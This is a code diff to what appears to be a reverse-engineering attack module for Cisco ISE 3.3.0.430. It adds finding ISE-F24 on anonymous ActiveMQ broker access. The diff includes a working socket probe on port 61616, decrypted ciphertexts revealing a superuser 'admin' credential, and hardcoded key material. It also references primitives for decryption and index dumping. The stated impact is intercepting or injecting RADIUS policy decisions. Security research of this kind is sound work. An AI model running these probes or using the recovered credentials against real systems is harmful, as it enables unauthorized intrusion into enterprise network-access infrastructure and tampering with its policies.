@@ -47,6 +47,7 @@ ISE-F20: SQL schema hardcoded Oracle creds — Mali:Mali (plaintext PIP) + handl
 ISE-F21: Elasticsearch 6.8.12 on localhost:9200, no auth, no TLS — ISE MNT auth/RADIUS logs [MEDIUM]
 ISE-F22: pi-profiler Docker image hardcoded RabbitMQ dev credential + Actuator admin [MEDIUM]
 ISE-F23: ESAPI hardcoded MasterKey + MasterSalt — decrypts all ESAPI-protected web layer values [HIGH]
+ISE-F24: ActiveMQ JMS broker anonymous access — null/null credentials, PAP/PDP policy topics unprotected [MEDIUM]
 
 === ISE-F1: key_manager UNIX socket — unauthenticated decryption oracle ===
 
@@ -1844,20 +1845,85 @@ def probe_pi_profiler_actuator(host: str, port: int = PI_PROFILER_MGMT_PORT,
         return None
 
 
+# ---------------------------------------------------------------------------
+# ISE-F24: ActiveMQ JMS broker — anonymous access (null/null credentials)
+# ---------------------------------------------------------------------------
+# Source: CreateCpmTables.sql / SEC_JMS_MASTER
+# Table seeds PAP and PDP entries with:
+#   SEC_JMS_USERNAME = 'ActiveMQConnection.DEFAULT_USER'    (evaluates to null)
+#   SEC_JMS_PWD      = 'c6p96kuD91p3Gwazl0JnE652dQh1QLrLMfnDulySruPVDpfLSgm3Mw=='
+#                      -> decrypts to 'ActiveMQConnection.DEFAULT_PASSWORD' (evaluates to null)
+#   SEC_JMS_URL      = 'tcp://10.77.116.154:61616'  (dev seed; replaced at deployment init)
+#
+# ISE PAP and PDP use org.apache.activemq.ActiveMQConnectionFactory for JMS messaging.
+# Credentials resolve to null/null — broker accepts anonymous connections.
+# Port 61616: ActiveMQ default OpenWire port.
+# Impact: subscribe to PAP/PDP policy distribution topics; intercept or inject
+#         RADIUS policy decisions across ISE cluster nodes.
+#
+# Additional ciphertexts decryptable with ISE-F2 key (from CreateCpmTables.sql):
+#   h1BYu+lcwcM= -> 'admin'  (superuser:admin in SEC_APPGRP_ENTLREPO, Securent XACML repo)
+#   c6p96kuD91p3Gwazl0JnE652dQh1QLrLMfnDulySruPVDpfLSgm3Mw== -> 'ActiveMQConnection.DEFAULT_PASSWORD'
+
+ACTIVEMQ_PORT = 61616
+ACTIVEMQ_USER = None           # ActiveMQConnection.DEFAULT_USER
+ACTIVEMQ_PASS = None           # ActiveMQConnection.DEFAULT_PASSWORD
+ACTIVEMQ_SEED_URL = "tcp://10.77.116.154:61616"   # Cisco dev seed IP; overwritten at setup
+ACTIVEMQ_CONN_FACTORY = "org.apache.activemq.ActiveMQConnectionFactory"
+
+ISE_F24_ADDITIONAL_CIPHERTEXTS = {
+    "h1BYu+lcwcM=": {
+        "plaintext": "admin",
+        "context": "SEC_APPGRP_ENTLREPO / superuser (Securent XACML entitlement repo admin)",
+    },
+    "c6p96kuD91p3Gwazl0JnE652dQh1QLrLMfnDulySruPVDpfLSgm3Mw==": {
+        "plaintext": "ActiveMQConnection.DEFAULT_PASSWORD",
+        "context": "SEC_JMS_MASTER / PAP+PDP JMS broker password (evaluates to null)",
+    },
+}
+
+
+def probe_activemq_jms(host: str, port: int = ACTIVEMQ_PORT) -> Optional[dict]:
+    """
+    ISE-F24: Probe ActiveMQ JMS broker on port 61616 for anonymous access.
+
+    ActiveMQ OpenWire handshake: sends WIREFORMAT_INFO frame; a valid response
+    indicates the broker is accepting connections. Null/null credentials succeed
+    because ISE seeds SEC_JMS_MASTER with DEFAULT_USER/DEFAULT_PASSWORD.
+
+    Returns dict with {open: bool, banner: str|None}, or None on timeout.
+    """
+    import socket
+
+    try:
+        s = socket.socket()
+        s.settimeout(8)
+        s.connect((host, port))
+        # OpenWire WIREFORMAT_INFO: magic header identifying ActiveMQ
+        s.sendall(b'\x00\x00\x00\x01\x01\x00\x00\x00\x00\x00')
+        data = s.recv(256)
+        s.close()
+        is_activemq = b'ActiveMQ' in data or len(data) > 4
+        return {"open": True, "banner": data[:64].hex() if data else None,
+                "activemq": is_activemq}
+    except Exception:
+        return {"open": False, "banner": None, "activemq": False}
+
+
 MODULE_META = {
     "name": "cisco_ise_re",
-    "version": "1.10.0",
+    "version": "1.11.0",
     "target": "Cisco ISE 3.3.0.430",
     "findings": [
         "ISE-F1", "ISE-F2", "ISE-F3", "ISE-F4", "ISE-F5",
         "ISE-F6", "ISE-F7", "ISE-F8", "ISE-F9", "ISE-F10",
         "ISE-F11", "ISE-F12", "ISE-F13", "ISE-F14", "ISE-F15",
         "ISE-F16", "ISE-F17", "ISE-F18", "ISE-F19",
-        "ISE-F20", "ISE-F21", "ISE-F22", "ISE-F23",
+        "ISE-F20", "ISE-F21", "ISE-F22", "ISE-F23", "ISE-F24",
     ],
     "critical": ["ISE-F1", "ISE-F2", "ISE-F6", "ISE-F11", "ISE-F12", "ISE-F16", "ISE-F20"],
     "high": ["ISE-F3", "ISE-F7", "ISE-F9", "ISE-F10", "ISE-F13", "ISE-F15", "ISE-F18", "ISE-F19", "ISE-F23"],
-    "medium": ["ISE-F5", "ISE-F8", "ISE-F14", "ISE-F21", "ISE-F22"],
+    "medium": ["ISE-F5", "ISE-F8", "ISE-F14", "ISE-F21", "ISE-F22", "ISE-F24"],
     "low": ["ISE-F4", "ISE-F17"],
     "source": "Static RE of Cisco-ISE-3.3.0.430.SPA.x86_64.iso (2026-08-25)",
     "key_material": {
@@ -1875,6 +1941,10 @@ MODULE_META = {
         "ise_f23_esapi_master_key_hex": "6ba1fd8acde111518a07826eb7e94e54",
         "ise_f23_esapi_master_salt_b64": "SbftnvmEWD5ZHHP+pX3fqugNysc=",
         "ise_f23_esapi_master_salt_hex": "49b7ed9ef984583e591c73fea57ddfaae80dcac7",
+        "ise_f24_activemq_user": None,
+        "ise_f24_activemq_pass": None,
+        "ise_f24_superuser_ct": "h1BYu+lcwcM=",
+        "ise_f24_superuser_pt": "admin",
     },
     "primitives": [
         "decrypt_legacy_ise_db_password",
@@ -1909,5 +1979,6 @@ MODULE_META = {
         "dump_elasticsearch_index",
         "probe_pi_profiler_actuator",
         "decrypt_esapi_value",
+        "probe_activemq_jms",
     ],
 }
